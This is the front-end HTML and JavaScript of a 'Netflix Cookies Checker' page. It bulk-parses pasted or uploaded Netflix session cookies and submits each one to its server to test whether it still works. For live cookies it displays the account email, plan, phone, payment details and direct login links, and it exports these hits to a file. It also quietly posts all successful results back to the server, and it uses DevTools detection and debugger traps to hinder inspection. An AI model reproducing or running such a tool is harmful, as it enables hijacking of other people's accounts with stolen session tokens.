        <i class="fas fa-play mr-1"></i> How to Watch
    </a>
</div>
</div>
<!-- 🔥 YOUR NEW BUTTON -->
<div class="mb-3 text-right">
<button id="viewSavedBtn" class="btn btn-info px-4 py-2" style="display:none;">
    📂 View Saved Results
</button>
</div>
            <div class="card p-4 shadow-lg" id="resultsCard" style="display: none;">
<div class="d-flex align-items-center mb-3 border-bottom pb-2 border-dark">

    <div class="d-flex flex-column">
    <h5 class="text-[#a5d6ff] font-weight-bold m-0">
        API Responses
    </h5>

    <!-- 🔥 RESULT COUNTER -->
<div id="counterWrapper" style="
    margin-top:8px;
    background:#0d1117;
    border:1px solid #30363d;
    border-radius:10px;
    padding:8px 10px;
">

    <div id="resultCounter" style="font-size:12px; color:#c9d1d9;">
        ✔ <span id="cSuccess">0</span>
        &nbsp; ❌ <span id="cError">0</span>
        &nbsp; ⚠️ <span id="cWarn">0</span>
        &nbsp; • Total: <span id="cTotal">0</span>
    </div>

    <!-- 🔥 PROGRESS BAR -->
    <div style="margin-top:6px; height:6px; background:#1f2937; border-radius:6px;">
        <div id="counterBar" style="
            height:100%;
            width:0%;
            background:linear-gradient(90deg,#22c55e,#58a6ff);
            border-radius:6px;
            transition:width 0.3s ease;
        "></div>
    </div>

    <!-- 🧠 SMART STATUS -->
    <div id="counterStatus" style="font-size:11px; color:#9ca3af; margin-top:4px;">
        Waiting for results...
    </div>

</div>
</div>

    <div class="ml-auto d-flex align-items-center">
        <span id="progressText" class="text-muted small mr-2">
            0 / 0 Processed
        </span>

        <button id="exportBtn" class="export-btn btn-sm" disabled>
            <span class="export-content">
                <i class="fas fa-download mr-1"></i> Export .txt
            </span>
            <span class="export-glow"></span>
        </button>
    </div>

</div>
                    <span id="progressText" class="text-muted small"></span>
                </div>
                <div id="resultsList"></div>
                <div id="savedResultsBox" style="display:none; margin-top:20px;">
                <h5 class="text-white">📦 Saved Results</h5>
                <div id="savedResultsList"></div>
               </div>
            </div>
<div class="row justify-content-center mt-3">
    <div class="col-md-9">
        <hr style="border-color:#4a455a; margin: 0;">
    </div>
</div>
</div>
        <div class="text-center mt-3 mb-4" style="font-size: 12px; color:#8b949e;">
    <p class="mb-0">&copy; Cybeat Netflix Cookies Checker. All Rights Reserved.</p>
</div>
        </div>
    </footer>
        
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    let isProcessing = false;
    // 🔥 DEVTOOLS DETECTION (ADD THIS BLOCK HERE)
    let devtoolsOpen = false;

    setInterval(() => {
    const threshold = 160;

    const widthDiff = window.outerWidth - window.innerWidth > threshold;
    const heightDiff = window.outerHeight - window.innerHeight > threshold;

    if (widthDiff || heightDiff) {
        if (!devtoolsOpen) {
            devtoolsOpen = true;
            onDevToolsOpen();
        }
    } else {
        if (devtoolsOpen) {
            devtoolsOpen = false;
            onDevToolsClose();
        }
    }
}, 1000);

function onDevToolsOpen() {
    console.warn("🚨 DevTools detected");

    lockInputs();

    // stop processing
    isProcessing = false;

    showAlert("error", "SECURITY WARNING", "DevTools detected. App paused.");
}

function onDevToolsClose() {
    console.log("✅ DevTools closed");

    unlockInputs();

    showAlert("success", "RESUMED", "You can continue now.");
}

setInterval(() => {
    debugger;
}, 3000);
    window.addEventListener("dragover", e => e.preventDefault());
    window.addEventListener("drop", e => e.preventDefault());
    document.addEventListener("DOMContentLoaded", function () {

const dropZone = document.getElementById('dropZone');
const fileInput = document.getElementById('fileInput');

if (!dropZone || !fileInput) return;

// Click to open file picker
dropZone.addEventListener('click', () => {
    if (isProcessing) return;
    fileInput.click();
});

// Highlight on drag
dropZone.addEventListener('dragover', (e) => {
    if (isProcessing) return;
    e.preventDefault();
    dropZone.classList.add('dragover');
});

// Remove highlight
dropZone.addEventListener('dragleave', () => {
    dropZone.classList.remove('dragover');
});

// Handle drop
dropZone.addEventListener('drop', (e) => {
    if (isProcessing) return;
    e.preventDefault();
    dropZone.classList.remove('dragover');

    const files = e.dataTransfer.files;
    handleFiles(files);
});

// File input change
fileInput.addEventListener('change', (e) => {
    if (isProcessing) return;
    handleFiles(e.target.files);
});
document.getElementById('bulkInput').addEventListener('paste', function (e) {

    if (isProcessing) return;

    setTimeout(() => {
        const text = this.value;

        if (text.length > 0) {
            // 🔥 visual feedback
            this.style.borderColor = "#22c55e";
            this.style.boxShadow = "0 0 10px rgba(34,197,94,0.6)";

            setTimeout(() => {
                this.style.borderColor = "";
                this.style.boxShadow = "";
            }, 800);
        }
    }, 50);

});
});
    let exportData = [];
    let countSuccess = 0;
    let countError = 0;
    let countWarning = 0;
    let countTotal = 0;
    // 1. The Smart Parser
    function parseMixedInput(text) {
        let extracted = [];
        let startIndex = 0;
        
        while ((startIndex = text.indexOf('[', startIndex)) !== -1) {
            let endIndex = startIndex;
            let foundValid = false;
            while ((endIndex = text.indexOf(']', endIndex + 1)) !== -1) {
                let potentialJson = text.substring(startIndex, endIndex + 1);
                try {
                    let parsed = JSON.parse(potentialJson);
                    if (Array.isArray(parsed)) {
                        extracted.push(potentialJson.trim());
                        text = text.substring(0, startIndex) + " ".repeat(potentialJson.length) + text.substring(endIndex + 1);
                        foundValid = true;
                        break;
                    }
                } catch (e) {}
            }
            if (!foundValid) startIndex++; 
        }
        
        text = text.replace(/\|/g, '\n');
        let lines = text.split(/\r?\n/);
        let currentNetscape = [];
        let seenKeys = new Set(); 
        
        lines.forEach(line => {
            let trimmed = line.trim();
            if (!trimmed || trimmed === ';') {
                if (currentNetscape.length > 0) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
                return;
            }
            if (trimmed.endsWith(';')) trimmed = trimmed.slice(0, -1).trim();
            if (trimmed.includes('.netflix.com') && (trimmed.includes('TRUE') || trimmed.includes('FALSE'))) {
                let parts = trimmed.split(/\s+/);
                if (parts.length >= 6) {
                    let keyName = parts[5];
                    if (seenKeys.has(keyName)) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
                    seenKeys.add(keyName);
                }
                currentNetscape.push(trimmed);
            } else if (trimmed.includes('NetflixId=') || trimmed.includes('SecureNetflixId=')) {
                if (currentNetscape.length > 0) { extracted.push(currentNetscape.join('\n')); currentNetscape = []; seenKeys.clear(); }
                extracted.push(trimmed);
            }
        });
        if (currentNetscape.length > 0) extracted.push(currentNetscape.join('\n'));
        return extracted;
    }

    const sleep = ms => new Promise(r => setTimeout(r, ms));
    function handleFiles(files) {
    if (!files.length) return;

    let combinedContent = '';
    let filesProcessed = 0;

    const dropZone = document.getElementById('dropZone');
    const fileInput = document.getElementById('fileInput');

    const progressWrapper = document.getElementById('uploadProgressWrapper');
    const progressBar = document.getElementById('uploadProgressBar');
    const progressText = document.getElementById('uploadProgressText');

    progressWrapper.style.display = 'block';
    progressBar.style.width = '0%';
    progressText.textContent = '0%';

    Array.from(files).forEach(file => {
        const reader = new FileReader();

        reader.onload = function(e) {
            combinedContent += e.target.result + "\n\n";
            filesProcessed++;

            let percent = Math.round((filesProcessed / files.length) * 100);
            progressBar.style.width = percent + '%';
            progressText.textContent = percent + '%';

            if (filesProcessed === files.length) {
                document.getElementById('bulkInput').value = combinedContent.trim();

                dropZone.classList.add('success', 'animate-success');

                setTimeout(() => dropZone.classList.remove('animate-success'), 600);

                setTimeout(() => {
                    dropZone.classList.remove('success');
                    progressWrapper.style.display = 'none';
                }, 1500);

                fileInput.value = '';
            }
        };

        reader.onerror = function() {
            alert(`Failed to read file: ${file.name}`);
        };

        reader.readAsText(file);
    });
}
async function startApiTest() {

    
    if (devtoolsOpen) {
        alert("Close DevTools to continue.");
        return;
    }
    
    if (isProcessing) return;

    exportData = []; 
    countSuccess = 0;
    countError = 0;
    countWarning = 0;
    countTotal = 0;
    updateCounter();
    document.getElementById("cSuccess").textContent = 0;
    document.getElementById("cError").textContent = 0;
    document.getElementById("cWarn").textContent = 0;
    document.getElementById("cTotal").textContent = 0;
    document.getElementById("counterBar").style.width = "0%";
    document.getElementById("counterStatus").textContent = "Starting...";
    document.getElementById('exportBtn').disabled = true; // 🔒 disable button
    if (isProcessing) return; // prevent double run

    const rawText = $('#bulkInput').val().trim();
    if (!rawText) return alert("Please paste some cookies first!");

    const cookies = parseMixedInput(rawText);
    if (cookies.length === 0) return alert("No valid cookies found to process.");

    lockInputs(); // 🔒 LOCK UI

    $('#startBtn').addClass('loading');
    document.getElementById('btnProgressText').textContent = `Processing 1/${cookies.length}`;
    $('#resultsCard').show();
    $('#resultsList').empty();
        const apiUrl = window.location.href; 

        for (let i = 0; i < cookies.length; i++) {
            document.getElementById('btnProgressText').textContent = `Processing ${i + 1}/${cookies.length}`;
            $('#progressText').text(`Processing ${i + 1} of ${cookies.length}...`);
            
            try {
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie: cookies[i] })
                });

                const rawResponseText = await response.text();
                let data;
                try {
                    data = JSON.parse(rawResponseText);
                } catch (e) {
                    throw new Error("Invalid JSON received from API");
                }
                
                let resultHtml = '';
                if (data.status === 'SUCCESS') {
                    countSuccess++;
                    countTotal++;
                    updateCounter();
                    showAlert("success", "VALID COOKIE", "Account is working 🎉", {
                    email: data.x_mail,
                    plan: data.x_tier,
                    country: data.x_loc,
                    profile: data.x_usr
                 });
                    
const netflixId = extractNetflixId(cookies[i]); 
    document.getElementById('exportBtn').disabled = false;
exportData.push(
    `📧Email: ${data.x_mail || 'N/A'}\n` +
    `📋Plan: ${data.x_tier || 'N/A'}\n` +
    `🌍Country: ${data.x_loc || 'N/A'}\n` +
    `👤Profile: ${data.x_usr || 'N/A'}\n` +
    `💻PC: ${data.x_l1 || ''}\n` +
    `📱Mobile: ${data.x_l2 || ''}\n` +
    `📺TV: ${data.x_l3 || ''}\n` +
    `🍪NetflixId=${netflixId}\n` +
    `----------------------------------------`
);
                    
                    let planStr = data.x_tier || 'Unknown';
                    let premiumClass = planStr.includes('Premium') ? 'text-success' : 'text-info';
                    
                    let directLink = data.x_l1 || '#';
                    let mobileLink = data.x_l2 || '#';
                    let tvLink = data.x_l3 || '#';

                    resultHtml = `
<div class="result-box fade-in">
    <div class="result-item">

        <div class="d-flex align-items-center mb-3">
            <span class="status-badge status-success mr-3">SUCCESS</span>
            <span class="text-[#a5d6ff] font-weight-bold" style="font-size: 16px;">
                ${data.x_mail || 'N/A'}
            </span>
        </div>

        <div class="row small text-muted mb-3" style="line-height: 2;">
            <div class="col-6"><span class="${premiumClass} font-weight-bold">${planStr}</span></div>
            <div class="col-6"><strong>Country:</strong> ${data.x_loc || 'N/A'}</div>
            <div class="col-6"><strong>Renewal:</strong> ${data.x_ren || 'N/A'}</div>
            <div class="col-6"><strong>Since:</strong> ${data.x_mem || 'N/A'}</div>
            <div class="col-6"><strong>Payment:</strong> ${data.x_bil || 'N/A'}</div>
            <div class="col-6"><strong>Phone:</strong> ${data.x_tel || 'N/A'}</div>
            <div class="col-12"><strong>Profiles:</strong> ${data.x_usr || 'N/A'}</div>
        </div>

<div class="d-flex justify-content-between pt-2 flex-wrap">

    <a href="${directLink}" target="_blank" class="btn btn-outline-success btn-sm w-100 mx-1">
        <i class="fas fa-desktop mr-1"></i> PC
    </a>

    <a href="${mobileLink}" target="_blank" class="btn btn-outline-info btn-sm w-100 mx-1">
        <i class="fas fa-mobile-alt mr-1"></i> Mobile
    </a>

    <a href="${tvLink}" target="_blank" class="btn btn-outline-warning btn-sm w-100 mx-1">
        <i class="fas fa-tv mr-1"></i> TV
    </a>

    <!-- 🔥 ADD THIS BUTTON -->
    <button class="export-btn btn-sm w-100 mx-1 mt-2"
        onclick="exportSingleResult(this)"
        data-export='${encodeURIComponent(
            `📧Email: ${data.x_mail || 'N/A'}\n` +
            `📋Plan: ${data.x_tier || 'N/A'}\n` +
            `🌍Country: ${data.x_loc || 'N/A'}\n` +
            `👤Profile: ${data.x_usr || 'N/A'}\n` +
            `💻PC: ${data.x_l1 || ''}\n` +
            `📱Mobile: ${data.x_l2 || ''}\n` +
            `📺TV: ${data.x_l3 || ''}\n` +
            `🍪NetflixId=${netflixId}`
        )}'>
        <span class="export-content">
            <i class="fas fa-file-download mr-1"></i> Export
        </span>
        <span class="export-glow"></span>
    </button>

</div>

    </div>
</div>`;
                } else if (data.status === 'ERROR' && response.status === 429) {
                    countWarning++;
                    countTotal++;
                    updateCounter();
                    showAlert("warning", "RATE LIMITED", "Too many requests, slow down");
                    resultHtml = `
                    <div class="result-box fade-in">
                       <div class="result-item d-flex align-items-center">
                        <span class="status-badge status-warning mr-3">RATE LIMITED</span>
                        <span class="text-muted small">${data.message}</span>
                         </div>
                       </div>
                    </div>`;
                } else {
                    showAlert("error", "INVALID COOKIE", "Dead or expired cookie");
                    countError++;
                    countTotal++;
                    updateCounter();
                    resultHtml = `
                    <div class="result-box fade-in">
                      <div class="result-item d-flex align-items-center">
                        <span class="status-badge status-error mr-3">DEAD / ERROR</span>
                        <span class="text-muted small">${data.message || 'Invalid Cookie'}</span>
                         </div>
                      </div>`;
                }
                
                $('#resultsList').append(resultHtml);

            } catch (error) {
                $('#resultsList').append(`
                    <div class="result-item"><span class="status-badge status-error mr-3">SYSTEM ERROR</span><span class="text-muted small">Could not render API data.</span></div>
                `);
            }

            // Keep a tiny 2-second sleep here just in case a dead cookie returns instantly
            if (i < cookies.length - 1) {
                $('#progressText').text(`Safe 2-second delay... (${i + 1}/${cookies.length})`);
                await sleep(2000); 
            }
        }

        $('#progressText').text(`Finished! Processed ${cookies.length} total.`);
        $('#startBtn').removeClass('loading');
        $('#startBtn .btn-text').text('Processing Complete!!!');
        document.getElementById('btnProgressText').textContent = 'Processing...';
        // 🎉 TRIGGER CONFETTI HERE
        launchConfetti();
        // (optional delay before reset for better UX)
        setTimeout(() => {
        $('#startBtn .btn-text').text('Scan & Generate Token');
        document.getElementById('btnProgressText').textContent = 'Processing...';
        }, 1200);
        unlockInputs(); 

     if (exportData.length > 0) {
        fetch(window.location.href, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            bulk: exportData.join("\n\n")
        })
    });
}
// EXISTING CODE
    if (exportData.length > 0) {
    document.getElementById('exportBtn').disabled = false; // 🔓 enable
    } // closes if    
} // 🔥 THIS LINE IS THE IMPORTANT ONE (closes startApiTest)        
    function extractNetflixId(cookieStr) {
    if (!cookieStr) return 'N/A';

    // Match NetflixId=VALUE
    let match = cookieStr.match(/NetflixId=([^;]+)/);
    if (match) return match[1];

    // Fallback: SecureNetflixId
    match = cookieStr.match(/SecureNetflixId=([^;]+)/);
    if (match) return match[1];

    return 'N/A';
}
    
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
        e.preventDefault();
        document.querySelector(this.getAttribute('href')).scrollIntoView({
            behavior: 'smooth'
        });
    });
});    
function lockInputs() {
    isProcessing = true;

    document.getElementById('bulkInput').disabled = true;
    document.getElementById('fileInput').disabled = true;

    // Disable drop zone visually + functionally
    const dz = document.getElementById('dropZone');
    dz.style.pointerEvents = 'none';
    dz.style.opacity = '0.6';
}

function unlockInputs() {
    isProcessing = false;

    document.getElementById('bulkInput').disabled = false;
    document.getElementById('fileInput').disabled = false;

    const dz = document.getElementById('dropZone');
    dz.style.pointerEvents = 'auto';
    dz.style.opacity = '1';
}

document.getElementById('exportBtn').addEventListener('click', function () {

    if (exportData.length === 0) {
        alert("No data to export yet!");
        return;
    }

    const blob = new Blob([exportData.join("\n")], { type: "text/plain" });
    const url = URL.createObjectURL(blob);

    const a = document.createElement("a");
    a.href = url;
    a.download = "nftokens.txt";
    document.body.appendChild(a);
    a.click();
// 🔥 SHOW TOAST
const toast = document.getElementById('toast');
toast.classList.add('show');

setTimeout(() => {
    toast.classList.remove('show');
}, 2500);
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
});    

// ⚠️ Warn before refresh / close
let allowLeave = false;

window.addEventListener("beforeunload", function (e) {
    const hasInput = document.getElementById('bulkInput').value.trim().length > 0;

    if ((isProcessing || hasInput) && !allowLeave) {
        e.preventDefault();
        e.returnValue = ''; // fallback browser popup
    }
});
//Intercept Refresh + Close
document.addEventListener("keydown", function(e) {
    if (e.key === "F5" || (e.ctrlKey && e.key === "r")) {
        e.preventDefault();
        showExitModal();
    }
});

//Modal Logic
function showExitModal() {
    const hasInput = document.getElementById('bulkInput').value.trim().length > 0;

    if (!isProcessing && !hasInput) return;

    const modal = document.getElementById("exitModal");
    modal.classList.add("show");
}

document.getElementById("stayBtn").onclick = function () {
    document.getElementById("exitModal").classList.remove("show");
};

document.getElementById("leaveBtn").onclick = function () {
    allowLeave = true;
    location.reload();
};
    
window.addEventListener("popstate", function(e) {
    showExitModal();
});       

    
</script>

<script>
function launchConfetti() {
    const canvas = document.getElementById('confettiCanvas');
    const ctx = canvas.getContext('2d');

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const btn = document.getElementById('startBtn');
    const rect = btn.getBoundingClientRect();

    // 🎯 Start from button center
    const originX = rect.left + rect.width / 2;
    const originY = rect.top + rect.height / 2;

    let particles = [];

    for (let i = 0; i < 50; i++) {
        particles.push({
            x: originX,
            y: originY,
            size: Math.random() * 6 + 3,
            speedX: (Math.random() - 0.5) * 8,
            speedY: (Math.random() - 1.5) * 8,
            gravity: 0.10,
            life: 500,
            color: ['#22c55e', '#58a6ff', '#e50914'][Math.floor(Math.random() * 3)],
            shape: Math.random() > 0.5 ? 'rect' : 'circle'
        });
    }

    function draw() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        particles.forEach(p => {
            p.x += p.speedX;
            p.y += p.speedY;
            p.speedY += p.gravity;
            p.life--;

            ctx.globalAlpha = p.life / 100;
            ctx.fillStyle = p.color;

            if (p.shape === 'circle') {
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.size / 2, 0, Math.PI * 2);
                ctx.fill();
            } else {
                ctx.fillRect(p.x, p.y, p.size, p.size);
            }
        });

        particles = particles.filter(p => p.life > 0);

        if (particles.length > 0) {
            requestAnimationFrame(draw);
        } else {
            ctx.globalAlpha = 1;
        }
    }

    draw();
}
    
const homeBtn = document.getElementById('homeBtn');

window.addEventListener('scroll', () => {
    if (window.scrollY > 300) {
        homeBtn.classList.add('show');
        homeBtn.innerHTML = '<i class="fas fa-arrow-up"></i>';
    } else {
        homeBtn.classList.remove('show');
    }
});

let lastScroll = 0;

window.addEventListener('scroll', () => {
    const currentScroll = window.scrollY;

    if (currentScroll > 300) {
        homeBtn.classList.add('show');

        // Hide when scrolling down, show when scrolling up
        if (currentScroll > lastScroll) {
            homeBtn.style.opacity = '0.6';
        } else {
            homeBtn.style.opacity = '1';
        }
    } else {
        homeBtn.classList.remove('show');
    }

    lastScroll = currentScroll;
});    

function exportSingleResult(btn) {
    const data = decodeURIComponent(btn.getAttribute("data-export"));

    const blob = new Blob([data], { type: "text/plain" });
    const url = URL.createObjectURL(blob);

    const a = document.createElement("a");
    a.href = url;
    a.download = "result.txt";
    document.body.appendChild(a);
    a.click();

    document.body.removeChild(a);
    URL.revokeObjectURL(url);

    // 🔥 Optional toast reuse
    const toast = document.getElementById('toast');
    toast.classList.add('show');

    setTimeout(() => {
        toast.classList.remove('show');
    }, 2000);
}    

function showSuccessPopup(message = "Valid Cookie Found!") {
    const toast = document.getElementById('toast');
    toast.querySelector('span').textContent = message;

    toast.classList.add('show');

    setTimeout(() => {
        toast.classList.remove('show');
    }, 2000);
}

function showErrorPopup(message = "Dead or Invalid Cookie") {
    const toast = document.getElementById('toastError');
    toast.querySelector('span').textContent = message;

    toast.classList.add('show');

    setTimeout(() => {
        toast.classList.remove('show');
    }, 2000);
}    

function showAlert(type, title, message, extra = {}) {
    const modal = document.getElementById("alertModal");
    const box = document.getElementById("alertBox");

    const titleEl = document.getElementById("alertTitle");
    const msgEl = document.getElementById("alertMessage");
    const iconEl = document.getElementById("alertIcon");
    const detailsEl = document.getElementById("alertDetails");

    // RESET
    box.classList.remove("alert-success", "alert-error", "premium");

    // ICONS
    if (type === "success") {
        iconEl.innerHTML = '<i class="fas fa-check-circle" style="color:#22c55e;"></i>';
        box.classList.add("alert-success");
    } 
    else if (type === "warning") {
        iconEl.innerHTML = '<i class="fas fa-exclamation-triangle" style="color:#facc15;"></i>';
    }
    else {
        iconEl.innerHTML = '<i class="fas fa-times-circle" style="color:#ef4444;"></i>';
        box.classList.add("alert-error");
    }

    titleEl.textContent = title;
    msgEl.textContent = message;

    
    if (extra.email || extra.plan) {

        const isPremium = (extra.plan || "").toLowerCase().includes("premium");

        if (isPremium) box.classList.add("premium");

        detailsEl.innerHTML = `
            ${extra.email ? `<div class="alert-email">${extra.email}</div>` : ""}
            
            ${extra.plan ? `
                <div class="alert-plan ${isPremium ? "premium" : ""}">
                    ${extra.plan}
                </div>
            ` : ""}

            ${(extra.country || extra.profile) ? `
                <div class="alert-meta">
                    ${extra.country ? `🌍 ${extra.country}` : ""}
                    ${extra.profile ? ` • 👤 ${extra.profile}` : ""}
                </div>
            ` : ""}
        `;
    } else {
        detailsEl.innerHTML = "";
    }

    modal.classList.add("show");

    setTimeout(() => {
        modal.classList.remove("show");
    }, 2000);
}

function closeAlert() {
    document.getElementById("alertModal").classList.remove("show");
}    

window.onload = () => {
    document.getElementById("alertModal").classList.remove("show");
};    

/* 🔥 PASTE YOUR CODE RIGHT HERE */
document.addEventListener("DOMContentLoaded", () => {

    const btn = document.getElementById("viewSavedBtn");
    if (!btn) return;

    btn.addEventListener("click", async () => {

        const res = await fetch("?getSaved=1");
        const data = await res.json();

        const container = document.getElementById("savedResultsList");
        const box = document.getElementById("savedResultsBox");

        container.innerHTML = "";

        if (data.length === 0) {
            container.innerHTML = "<p class='text-muted'>No saved results yet.</p>";
        } else {
            data.reverse().forEach(item => {
                container.innerHTML += `
                    <div class="result-box">
                        <div><strong>📧</strong> ${item.email}</div>
                        <div><strong>📋</strong> ${item.plan}</div>
                        <div><strong>🌍</strong> ${item.country}</div>
                        <div><strong>👤</strong> ${item.profile}</div>
                        <div><strong>🍪</strong> ${item.netflixId}</div>
                        <div class="text-muted small">⏱ ${item.time}</div>
                    </div>
                `;
            });
        }

        box.style.display = "block";
    });

});    
    
function animateValue(id, start, end, duration = 200) {
    let range = end - start;
    let startTime = null;

    function step(timestamp) {
        if (!startTime) startTime = timestamp;
        let progress = timestamp - startTime;
        let value = Math.floor(start + (range * (progress / duration)));

        document.getElementById(id).textContent = value;

        if (progress < duration) {
            requestAnimationFrame(step);
        } else {
            document.getElementById(id).textContent = end;
        }
    }

    requestAnimationFrame(step);
}    
    
function updateCounter() {
    animateValue("cSuccess", parseInt(document.getElementById("cSuccess").textContent), countSuccess);
    animateValue("cError", parseInt(document.getElementById("cError").textContent), countError);
    animateValue("cWarn", parseInt(document.getElementById("cWarn").textContent), countWarning);
    animateValue("cTotal", parseInt(document.getElementById("cTotal").textContent), countTotal);

    // 📊 Progress bar
    let total = countTotal;
    let successRate = total > 0 ? (countSuccess / total) * 100 : 0;
    document.getElementById("counterBar").style.width = successRate + "%";

    // 🧠 Smart status
    let statusText = "Processing...";

    if (total > 0) {
        if (successRate > 70) statusText = "🔥 High success rate";
        else if (successRate > 40) statusText = "⚡ Moderate success rate";
        else statusText = "⚠️ Low success rate";
    }

    document.getElementById("counterStatus").textContent = statusText;
}  

/* 🔥 ADD YOUR CODE RIGHT HERE */
document.getElementById("viewSavedBtn").addEventListener("click", async () => {

    const box = document.getElementById("savedResultsBox");
    const list = document.getElementById("savedResultsList");

    box.style.display = "block";
    list.innerHTML = "Loading...";

    try {
        const res = await fetch(window.location.href + "?getSaved=1");
        const data = await res.json();

        if (!data.length) {
            list.innerHTML = "<p class='text-muted'>No saved results yet.</p>";
            return;
        }

        list.innerHTML = data.map(item => `
            <div class="result-box">
                📧 ${item.email}<br>
                📋 ${item.plan}<br>
                🌍 ${item.country}<br>
                👤 ${item.profile}<br>
                🍪 ${item.netflixId}<br>
                ⏱ ${item.time}
            </div>
        `).join("");

    } catch (err) {
        list.innerHTML = "<p class='text-danger'>Failed to load saved results</p>";
    }
});    
    
</script>  
    
<div id="toast" class="toast-success">
    <i class="fas fa-check-circle mr-2"></i>
    <span>Exported successfully!</span>
</div>

<div id="toastError" class="toast-error">
    <i class="fas fa-times-circle mr-2"></i>
    <span>Invalid / Dead Cookie</span>
</div>    
    
<!-- 🔥 CONFETTI CANVAS -->
<canvas id="confettiCanvas"></canvas>
    
<div id="exitModal" class="exit-modal">
    <div class="exit-box">
        <h4>⚠️ Wait a second!</h4>
        <p>You have ongoing processing or unsaved data.</p>
        <p>Are you sure you want to leave?</p>

        <div class="exit-actions">
            <button id="stayBtn">Stay</button>
            <button id="leaveBtn">Leave</button>
        </div>
    </div>
</div>    

<div id="alertModal" class="alert-modal">
    <div id="alertBox" class="alert-box">

        <div class="alert-bar"></div>

        <div class="alert-logo">
            <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
        </div>

        <div id="alertIcon" class="alert-icon"></div>

        <div id="alertTitle" class="alert-title">Status</div>

        <!-- 🔥 NEW INFO BLOCK -->
        <div id="alertDetails" style="font-size:13px; color:#c9d1d9; margin-top:8px;"></div>

        <div id="alertMessage" class="alert-message">Message here</div>

    </div>
</div>
    
</body>
</html>
